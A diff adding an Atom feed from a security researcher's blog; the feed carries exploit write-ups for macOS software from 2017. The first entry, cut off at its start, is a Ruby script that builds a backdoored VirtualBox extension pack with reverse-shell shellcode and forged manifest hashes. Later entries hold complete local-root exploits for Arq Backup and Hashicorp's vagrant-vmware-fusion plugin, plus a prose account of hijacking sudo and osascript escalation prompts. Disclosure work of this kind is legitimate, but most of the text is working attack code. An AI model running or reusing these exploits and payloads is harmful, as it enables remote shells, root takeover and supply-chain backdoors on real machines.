+
+int (*sc)();
+
+char target_ip[] = \&amp;quot;#{ARGV[0]}\&amp;quot;;
+short target_port = #{ARGV[1]};
+
+char shellcode[] =
+  \&amp;quot;\\x41\\xB0\\x02\\x49\\xC1\\xE0\\x18\\x49\\x83\\xC8\\x61\\x4C\\x89\\xC0\\x48\&amp;quot;
+  \&amp;quot;\\x31\\xD2\\x48\\x89\\xD6\\x48\\xFF\\xC6\\x48\\x89\\xF7\\x48\\xFF\\xC7\\x0F\&amp;quot;
+  \&amp;quot;\\x05\\x49\\x89\\xC4\\x49\\xBD\\x01\\x01\\x11\\x5C\\xFF\\xFF\\xFF\\xFF\\x41\&amp;quot;
+  \&amp;quot;\\xB1\\xFF\\x4D\\x29\\xCD\\x41\\x55\\x49\\x89\\xE5\\x49\\xFF\\xC0\\x4C\\x89\&amp;quot;
+  \&amp;quot;\\xC0\\x4C\\x89\\xE7\\x4C\\x89\\xEE\\x48\\x83\\xC2\\x10\\x0F\\x05\\x49\\x83\&amp;quot;
+  \&amp;quot;\\xE8\\x08\\x48\\x31\\xF6\\x4C\\x89\\xC0\\x4C\\x89\\xE7\\x0F\\x05\\x48\\x83\&amp;quot;
+  \&amp;quot;\\xFE\\x02\\x48\\xFF\\xC6\\x76\\xEF\\x49\\x83\\xE8\\x1F\\x4C\\x89\\xC0\\x48\&amp;quot;
+  \&amp;quot;\\x31\\xD2\\x49\\xBD\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x49\\xC1\\xED\&amp;quot;
+  \&amp;quot;\\x08\\x41\\x55\\x48\\x89\\xE7\\x48\\x31\\xF6\\x0F\\x05\&amp;quot;;
+
+__attribute__((constructor))
+void customConstructor(int argc, char **argv)
+{
+  struct in_addr ip;
+  char *tp = (char *)&amp;amp;target_port;
+
+  shellcode[38] = tp[1];
+  shellcode[39] = tp[0];
+
+  inet_aton(target_ip, (struct in_addr *)&amp;amp;ip);
+  memcpy((char *)&amp;amp;shellcode[40], (char *)&amp;amp;ip.s_addr, 4);
+
+  void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
+
+  if (ptr == MAP_FAILED) {
+    perror(\&amp;quot;mmap\&amp;quot;);
+    exit(-1);
+  }
+  memcpy(ptr, shellcode, sizeof(shellcode));
+  sc = ptr;
+
+  sc();
+}
+&amp;quot;)
+end
+
+system(&amp;quot;clang -dynamiclib -std=gnu99 attack.c -o attack.dylib&amp;quot;)
+File.delete(&amp;quot;attack.c&amp;quot;)
+
+if !File.exist? &amp;quot;vbox_exp_temp&amp;quot;
+  Dir.mkdir(&amp;quot;vbox_exp_temp&amp;quot;)
+end
+Dir.chdir(&amp;quot;vbox_exp_temp&amp;quot;)
+
+puts &amp;quot;looking for latest extpack at virtualbox.org...&amp;quot;
+
+downloads_html = `curl -s &lt;a href=&quot;https://www.virtualbox.org/wiki/Downloads&quot;&gt;https://www.virtualbox.org/wiki/Downloads&lt;/a&gt;`
+
+match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)
+
+if !match or !match[0]
+  puts &amp;quot;failed to find &lt;a href=&quot;http:// link to the extpack.&amp;quot&quot;&gt;http:// link to the extpack.&amp;quot&lt;/a&gt;;
+  exit 1
+end
+
+puts &amp;quot;downloading extpack... &amp;quot;
+
+filename = match[0].split(&amp;quot;/&amp;quot;)[-1]
+
+system(&amp;quot;curl -s #{match[0]} -o #{filename}&amp;quot;)
+
+puts &amp;quot;unpacking extpack... &amp;quot;
+
+system(&amp;quot;tar zxf #{filename}&amp;quot;)
+File.delete(filename)
+
+puts &amp;quot;substituting #{target_dylib}... &amp;quot;
+
+File.delete(&amp;quot;darwin.amd64/#{target_dylib}&amp;quot;)
+File.rename(&amp;quot;../attack.dylib&amp;quot;, &amp;quot;darwin.amd64/#{target_dylib}&amp;quot;)
+
+puts &amp;quot;patching manifest... &amp;quot;
+
+File.open(&amp;quot;ExtPack.manifest.new&amp;quot;,&amp;quot;w&amp;quot;) do |f|
+  File.read(&amp;quot;ExtPack.manifest&amp;quot;).chomp.split(&amp;quot;\n&amp;quot;).each do |line|
+    r = target_dylib.gsub(&amp;#39;.&amp;#39;,&amp;#39;\.&amp;#39;)
+
+    if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
+      case match[1]
+      when &amp;quot;MD5&amp;quot;
+        md5 = Digest::MD5.hexdigest File.read(&amp;quot;darwin.amd64/#{target_dylib}&amp;quot;)
+        f.write(&amp;quot;MD5 (darwin.amd64/#{target_dylib}) = #{md5}\n&amp;quot;)
+      when &amp;quot;SHA256&amp;quot;
+        sha256 = Digest::SHA256.hexdigest File.read(&amp;quot;darwin.amd64/#{target_dylib}&amp;quot;)
+        f.write(&amp;quot;SHA256 (darwin.amd64/#{target_dylib}) = #{sha256}\n&amp;quot;)
+      when &amp;quot;SHA512&amp;quot;
+        sha512 = Digest::SHA512.hexdigest File.read(&amp;quot;darwin.amd64/#{target_dylib}&amp;quot;)
+        f.write(&amp;quot;SHA512 (darwin.amd64/#{target_dylib}) = #{sha512}\n&amp;quot;)
+      when &amp;quot;SHA1&amp;quot;
+        sha1 = Digest::SHA1.hexdigest File.read(&amp;quot;darwin.amd64/#{target_dylib}&amp;quot;)
+        f.write(&amp;quot;SHA1 (darwin.amd64/#{target_dylib}) = #{sha1}\n&amp;quot;)
+      when &amp;quot;SIZE&amp;quot;
+        size = File.size &amp;quot;darwin.amd64/#{target_dylib}&amp;quot;
+        f.write(&amp;quot;SIZE (darwin.amd64/#{target_dylib}) = #{size}\n&amp;quot;)
+      end
+    else
+      f.write(line + &amp;quot;\n&amp;quot;)
+    end
+  end
+end
+
+File.delete(&amp;quot;ExtPack.manifest&amp;quot;)
+File.rename(&amp;quot;ExtPack.manifest.new&amp;quot;, &amp;quot;ExtPack.manifest&amp;quot;)
+
+puts &amp;quot;creating tarball... &amp;quot;
+system(&amp;quot;tar -zcf ../#{filename} *&amp;quot;)
+
+Dir.chdir(&amp;quot;..&amp;quot;)
+system(&amp;quot;rm -rf vbox_exp_temp&amp;quot;)
+
+puts &amp;quot;\ncreated backdoored extpack: #{filename}\n\n&amp;quot;&lt;/pre&gt;</summary>
+    <title>Owning VirtualBox via MITM</title>
+    <updated>2017-11-30T08:25:03+00:00</updated>
+    <dc:date>2017-11-30T08:25:03+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/escalation-hijacking-on-macs.html</id>
+    <link href="http://m4.rkw.io/blog/escalation-hijacking-on-macs.html"/>
+    <summary>&lt;pre&gt;With all the hype today about the blank-password root bug in High Sierra I
+thought I&amp;#39;d write a quick post about escalation hihacking on macOS and how
+common it is for software to be vulnerable to this.
+
+Consider the case of malware gaining execution on a mac. This is pretty bad to
+begin with but it&amp;#39;s all the more worse if the malware obtains root access. Even
+with apple&amp;#39;s &amp;quot;rootless&amp;quot; feature it still provides a potential path to
+rootkitting the machine, loading kexts etc.
+
+I&amp;#39;ve found a slew of privilege escalation issues in various Mac applications
+this year but as well as these more direct exploits I&amp;#39;ve also noticed that a lot
+of mac software that requires elevated privileges requested with an
+authentication prompt does so in a way that can be easily and silently hijacked
+by a third party process.
+
+The two most common insecure ways of doing this that I&amp;#39;ve seen are:
+
+1) sudo
+
+2) applescript via osascript, eg &amp;quot;execute blah with administrator privileges&amp;quot;
+
+In both cases these actions pause waiting for user authentication and are
+clearly visible in the process list. Since we can see the exact shell commands
+that are going to be executed with sudo or osascript and that the user will take
+at least a couple of seconds to enter their password, we have the perfect
+opportunity to steal the escalation.
+
+Consider this sudo command in the process list:
+
+sudo chown root:wheel /tmp/some/file &amp;amp;&amp;amp; sudo chmod 4755 /tmp/some/file
+
+If we know that this will occasionally occur given that application X is
+installed we can lie in wait until it happens and then switch /tmp/some/file out
+for some other arbitrary payload. Once it&amp;#39;s been made root-owned and +s we can
+then use it to escalate, swap the original file back in place and set the
+required permissions on that so the user will have no idea that anything
+happened.
+
+To make this even easier we can even send a STOP signal to the parent process to
+effectively pause it until our meddling is complete and then send a CONT signal
+to resume it.
+
+An example of an exploit using this technique is my code for the 5.0.0 release
+of the Hashicorp vagrant-vmware-fusion plugin:
+
+&lt;a href=&quot;https://m4.rkw.io/blog/cve201715884-local-root-privesc-in-hashicorp-vagrantvmwarefusion-500.html&quot;&gt;https://m4.rkw.io/blog/cve201715884-local-root-privesc-in-hashicorp-vagrantvm...&lt;/a&gt;
+
+However this vulnerability is present in loads of Mac software. Eventually smart
+malware authors will realise this and start rolling such exploits into their
+malware so that they can escalate opportunistically.&lt;/pre&gt;</summary>
+    <title>Escalation hijacking on macs</title>
+    <updated>2017-11-29T21:04:29+00:00</updated>
+    <dc:date>2017-11-29T21:04:29+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/cve201716895-local-root-privesc-in-arq-backup--597.html</id>
+    <link href="http://m4.rkw.io/blog/cve201716895-local-root-privesc-in-arq-backup--597.html"/>
+    <summary>&lt;pre&gt;As well as the other bugs affecting Arq &amp;lt;= 5.9.6 there is also another issue
+with the suid-root restorer binaries in Arq for Mac. There are three of them
+and they are used to execute restores of backed up files from the various
+cloud providers.
+
+After reversing the inter-app protocol I discovered that the path to the
+restorer binary was specified as part of the data packet sent by the UI. After
+receiving this, the restorer binaries then set +s and root ownership on this
+path. This means we can specify an arbitrary path which will receive +s and root
+ownership.
+
+This issue is fixed in Arq 5.10.
+
+&lt;a href=&quot;https://m4.rkw.io/arq_5.9.7.rb.txt&quot;&gt;https://m4.rkw.io/arq_5.9.7.rb.txt&lt;/a&gt;
+b274aed5fabfe5e1ed7ff14cc6f0ff20f645ecfe0ec329b23cd7410a3cf990a6
+----------------------------------------------------------------------------
+#!/usr/bin/env ruby
+
+##################################################################
+###### Arq &amp;lt;= 5.9.7 local root privilege escalation exploit ######
+###### by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html&quot;&gt;https://m4.rkw.io/blog.html&lt;/a&gt;               ######
+##################################################################
+
+s = File.stat(&amp;quot;/Applications/Arq.app/Contents/Resources/standardrestorer&amp;quot;)
+
+if s.mode != 0104755 or s.uid != 0
+  puts &amp;quot;Not vulnerable - standardrestorer is not suid root.&amp;quot;
+  exit 1
+end
+
+binary_target = &amp;quot;/tmp/arq_597_exp&amp;quot;
+
+d = &amp;quot;\x01\x00\x00\x00\x00\x00\x00\x00&amp;quot;
+e = &amp;quot;\x00\x00\x00\x00\x03&amp;quot;
+z = &amp;quot;0000&amp;quot;
+target = sprintf(&amp;quot;%s%s-%s-%s-%s-%s%s%s&amp;quot;, z,z,z,z,z,z,z,z)
+plist = &amp;quot;&amp;lt;plist version=\&amp;quot;1.0\&amp;quot;&amp;gt;&amp;lt;dict&amp;gt;&amp;lt;\/dict&amp;gt;&amp;lt;\/plist&amp;gt;&amp;quot;
+backup_set = &amp;quot;0&amp;quot; * 40
+hmac = &amp;quot;0&amp;quot; * 40
+
+payload = sprintf(
+  &amp;quot;%s%s%s%s\$%s%s\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00&amp;quot; +
+  &amp;quot;\x00\x00\x00\x00\x00\x09\x00\x00\x02\xd0\x96\x82\xef\xd8\x00\x00\x00\x00&amp;quot; +
+  &amp;quot;\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x08\x30\x2e\x30&amp;quot; +
+  &amp;quot;\x30\x30\x30\x30\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&amp;quot; +
+  &amp;quot;\x00\x00\x00\x00\x00\x00\x00%s%s%s\x28%s\x01\x00\x00\x00%s\x00\x00\x00%s&amp;quot; +
+  &amp;quot;\x00\x00\x00\x00\x16\x00\x00\x00\x02%s\x28%s\x01\x00\x00\x00%s\x00\x00&amp;quot; +
+  &amp;quot;\x00%s\x00\x00\x00\x00\x00\x00\x00\x01\xf5\x00\x00\x00\x00\x00\x00\x00&amp;quot; +
+  &amp;quot;\x14\x00%s\x00\x00\x00\x00\x03%s\x0a&amp;quot;,
+    d, binary_target.length.chr, binary_target,
+    d, target,
+    d, plist.length.chr, plist,
+    d, backup_set,
+    d, d, d, hmac,
+    d, d, d, e * 10
+  )
+
+shellcode = &amp;quot;#include &amp;lt;unistd.h&amp;gt;\nint main()\n{ setuid(0);setgid(0);&amp;quot;+
+  &amp;quot;execl(\&amp;quot;/bin/bash\&amp;quot;,\&amp;quot;bash\&amp;quot;,\&amp;quot;-c\&amp;quot;,\&amp;quot;rm -f #{binary_target};/bin/bash\&amp;quot;,&amp;quot;+
+  &amp;quot;NULL);return 0; }&amp;quot;
+
+IO.popen(&amp;quot;gcc -xc -o #{binary_target} -&amp;quot;, mode=&amp;quot;r+&amp;quot;) do |io|
+  io.write(shellcode)
+  io.close
+end
+
+IO.popen(&amp;quot;/Applications/Arq.app/Contents/Resources/standardrestorer &amp;quot; +
+  &amp;quot;2&amp;gt;/dev/null&amp;quot;, mode=&amp;quot;r+&amp;quot;) do |io|
+  io.getc &amp;amp;&amp;amp; io.write(payload)
+end
+
+timeout=3
+i=0
+
+while (s = File.stat(binary_target)) &amp;amp;&amp;amp; (s.mode != 0104755 or s.uid != 0)
+  sleep 0.1
+  i += 1
+
+  if i &amp;gt;= (timeout * 10)
+    break
+  end
+end
+
+if s.mode == 0104755 and s.uid == 0
+  system(binary_target)
+  exit 0
+end
+
+puts &amp;quot;exploit failed&amp;quot;&lt;/pre&gt;</summary>
+    <title>CVE-2017-16895 Local root privesc in Arq Backup &lt;= 5.9.7</title>
+    <updated>2017-11-29T19:09:43+00:00</updated>
+    <dc:date>2017-11-29T19:09:43+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/cve201715357-local-root-privesc-in-arq-backup--596.html</id>
+    <link href="http://m4.rkw.io/blog/cve201715357-local-root-privesc-in-arq-backup--596.html"/>
+    <summary>&lt;pre&gt;Arq Backup from Haystack Software is a great application for backing up macs and
+windows machines. Unfortunately versions of Arq for mac before 5.9.7 are
+vulnerable to a local root privilege escalation exploit.
+
+The updater binary has a &amp;quot;setpermissions&amp;quot; function which sets the suid bit and
+root ownership on itself but it suffers from a race condition that allows you to
+swap the destination for these privileges using a symlink.
+
+We can exploit this to get +s and root ownership on any arbitrary binary.
+
+Other binaries in the application also suffer from the same issue.
+
+This was fixed in Arq 5.9.7.
+
+&lt;a href=&quot;https://m4.rkw.io/arq_5.9.6.sh.txt&quot;&gt;https://m4.rkw.io/arq_5.9.6.sh.txt&lt;/a&gt;
+49cc82df33a3e23245c7a1659cc74c0e554d5fdbe2547ac14e838338e823956d
+------------------------------------------------------------------------------
+#!/bin/bash
+
+##################################################################
+###### Arq &amp;lt;= 5.9.6 local root privilege escalation exploit ######
+###### by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html&quot;&gt;https://m4.rkw.io/blog.html&lt;/a&gt;                 ####
+##################################################################
+
+vuln=`ls -la /Applications/Arq.app/Contents/Library/LoginItems/\
+Arq\ Agent.app/Contents/Resources/arq_updater |grep &amp;#39;rwsr-xr-x&amp;#39; \
+|grep root`
+
+cwd=&amp;quot;`pwd`&amp;quot;
+
+if [ &amp;quot;$vuln&amp;quot; == &amp;quot;&amp;quot; ] ; then
+  echo &amp;quot;Not vulnerable - auto-updates not enabled.&amp;quot;
+  exit 1
+fi
+
+cat &amp;gt; arq_596_exp.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(
+    &amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;rm -f $cwd/arq_updater;/bin/bash&amp;quot;,
+    NULL
+  );
+  return 0;
+}
+EOF
+
+gcc -o arq_596_exp arq_596_exp.c
+rm -f arq_596_exp.c
+
+ln -s /Applications/Arq.app/Contents/Library/LoginItems/\
+Arq\ Agent.app/Contents/Resources/arq_updater
+
+./arq_updater setpermissions &amp;amp;&amp;gt;/dev/null&amp;amp;
+rm -f ./arq_updater
+mv arq_596_exp ./arq_updater
+
+i=0
+timeout=10
+
+while :
+do
+  r=`ls -la ./arq_updater |grep root`
+  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    break
+  fi
+  sleep 0.1
+  i=$((i+1))
+  if [ $i -eq $timeout ] ; then
+    rm -f ./arq_updater
+    echo &amp;quot;Not vulnerable&amp;quot;
+    exit 1
+  fi
+done
+
+./arq_updater&lt;/pre&gt;</summary>
+    <title>CVE-2017-15357 Local root privesc in Arq Backup &lt;= 5.9.6</title>
+    <updated>2017-11-29T19:02:01+00:00</updated>
+    <dc:date>2017-11-29T19:02:01+00:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/cve201716777-local-root-privesc-in-hashicorp-vagrantvmwarefusion-503.html</id>
+    <link href="http://m4.rkw.io/blog/cve201716777-local-root-privesc-in-hashicorp-vagrantvmwarefusion-503.html"/>
+    <summary>&lt;pre&gt;Another day, another root privesc bug in this plugin. Not quite so serious this
+time - this one is only exploitable if the user has the plugin installed but
+VMware Fusion *not* installed. This is a fairly unlikely scenario but it&amp;#39;s a
+straight to root privesc with no user interaction so isn&amp;#39;t the kind of thing
+that should be shipping with any software.
+
+This occurs because the suid root sudo helper that I have discussed in previous
+exploit writeups executes /Applications/VMware
+Fusion.app/Contents/Library/vmnet-cli
+as root, but if the application isn&amp;#39;t installed and we&amp;#39;re a local admin user we
+can create a fake app directory with a payload in place of vmnet-cli that gets
+executed as root.
+
+HashiCorp fixed this (very quickly) in 5.0.4.
+
+&lt;a href=&quot;https://m4.rkw.io/vagrant_vmware_privesc_5.0.3.sh.txt&quot;&gt;https://m4.rkw.io/vagrant_vmware_privesc_5.0.3.sh.txt&lt;/a&gt;
+3c11083386b3f7352d60b327190eed4364383c0622351db5410d809f4bda746a
+------------------------------------------------------------------------------
+#!/bin/bash
+echo
+echo &amp;quot;#########################################################&amp;quot;
+echo &amp;quot;# vagrant_vmware_fusion plugin 5.0.3 local root privesc #&amp;quot;
+echo &amp;quot;# by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html                #&amp;quot&quot;&gt;https://m4.rkw.io/blog.html                #&amp;quot&lt;/a&gt;;
+echo &amp;quot;#########################################################&amp;quot;
+echo &amp;quot;# Note: only works when VMWare Fusion is not installed. #&amp;quot;
+echo &amp;quot;#########################################################&amp;quot;
+echo
+
+cleanup() {
+  exec 2&amp;gt; /dev/null
+  killall -9 vagrant 1&amp;gt;/dev/null 2&amp;gt;/dev/null
+  kill -9 `ps auxwww |egrep &amp;#39;\/vagrant up$&amp;#39; |xargs -L1 |cut -d &amp;#39; &amp;#39; -f2` &amp;amp;&amp;gt;/dev/null
+  exec 2&amp;gt; /dev/tty
+  cd
+  rm -rf .vagrant_vmware_fusion_503_exp
+  rm -rf /Applications/VMware\ Fusion.app
+}
+
+if [ -e &amp;quot;/Applications/VMware Fusion.app&amp;quot; ] ; then
+  echo &amp;quot;Fusion is installed, not exploitable.&amp;quot;
+  exit 1
+fi
+
+echo &amp;quot;setting up fake app directory...&amp;quot;
+
+mkdir /Applications/VMware\ Fusion.app
+if [ ! $? -eq 0 ] ; then
+  echo &amp;quot;Failed to create /Applications/VMware Fusion.app.&amp;quot;
+  exit 1
+fi
+
+mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services
+
+touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+touch /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+
+cat &amp;gt; /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx &amp;lt;&amp;lt;EOF
+#!/bin/bash
+echo 1&amp;gt;&amp;amp;2
+echo &amp;quot;VMware Fusion Information:&amp;quot; 1&amp;gt;&amp;amp;2
+echo &amp;quot;VMware Fusion 10.0.1 build-6754183 Release&amp;quot; 1&amp;gt;&amp;amp;2
+echo
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx
+
+cat &amp;gt; /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli &amp;lt;&amp;lt;EOF
+#!/bin/bash
+chown root:wheel /tmp/vvp_503
+chmod 4755 /tmp/vvp_503
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli
+
+echo &amp;quot;compiling payload...&amp;quot;
+
+cat &amp;gt; /tmp/vvp_503.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(&amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;rm -f /tmp/vvp_503; /bin/bash&amp;quot;,NULL);
+  return 0;
+}
+EOF
+gcc -o /tmp/vvp_503 /tmp/vvp_503.c
+rm -f /tmp/vvp_503.c
+
+cd
+mkdir .vagrant_vmware_fusion_503_exp
+cd .vagrant_vmware_fusion_503_exp
+
+echo &amp;quot;writing dummy vagrantfile ...&amp;quot;
+
+cat &amp;gt; vagrantfile &amp;lt;&amp;lt;EOF
+Vagrant.configure(&amp;#39;2&amp;#39;) do |config|
+  config.vm.box = &amp;#39;envimation/ubuntu-xenial&amp;#39;
+end
+EOF
+
+echo &amp;quot;triggering vagrant up [stage 1]...&amp;quot;
+
+vagrant up &amp;amp;&amp;gt;/dev/null &amp;amp;
+
+while :
+do
+  r=`ps auxwww |grep &amp;#39;vagrant up&amp;#39; |grep -v grep`
+  if [ &amp;quot;$r&amp;quot; == &amp;quot;&amp;quot; ] ; then
+    break
+  fi
+  sleep 0.5
+done
+
+echo &amp;quot;dropping dummy machine...&amp;quot;
+
+uuid=`ls -1 .vagrant/machines/default/vmware_fusion |grep -v vagrant_cwd`
+touch .vagrant/machines/default/vmware_fusion/$uuid/ubuntu-xenial-vmware-fusion.vmx
+echo -n &amp;quot;`pwd`/.vagrant/machines/default/vmware_fusion/$uuid/ubuntu-xenial-vmware-fusion.vmx&amp;quot; &amp;gt; .vagrant/machines/default/vmware_fusion/id
+
+echo &amp;quot;triggering vagrant up [stage 2]...&amp;quot;
+
+vagrant up &amp;amp;&amp;gt;/dev/null &amp;amp;
+
+echo &amp;quot;waiting for payload to trigger ...&amp;quot;
+
+count=0
+success=0
+
+while :
+do
+  r=`ls -la /tmp/vvp_503 |grep -- &amp;#39;-rwsr-xr-x  1 root  wheel&amp;#39;`
+  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    success=1
+    break
+  fi
+  r=`ps auxwww |grep &amp;#39;vagrant up&amp;#39; |grep -v grep`
+  if [ &amp;quot;$r&amp;quot; == &amp;quot;&amp;quot; ] ; then
+    break
+  fi
+  sleep 0.2
+  count=$(($count + 1))
+  if [ $count -eq 250 ] ; then
+    echo &amp;quot;Timed out waiting for the payload to trigger.&amp;quot;
+    cleanup
+    exit 1
+  fi
+done
+
+cleanup
+
+if [ ! $success -eq 1 ] ; then
+  echo &amp;quot;exploit failed.&amp;quot;
+  exit 1
+fi
+
+echo
+cd
+/tmp/vvp_503&lt;/pre&gt;</summary>
+    <title>CVE-2017-16777 Local root privesc in Hashicorp vagrant-vmware-fusion 5.0.3</title>
+    <updated>2017-11-15T08:21:15+00:00</updated>
+    <dc:date>2017-11-15T08:21:15+00:00</dc:date>
+  </entry>
+  <dc:date>2021-06-17T15:22:56+01:00</dc:date>
+</feed>
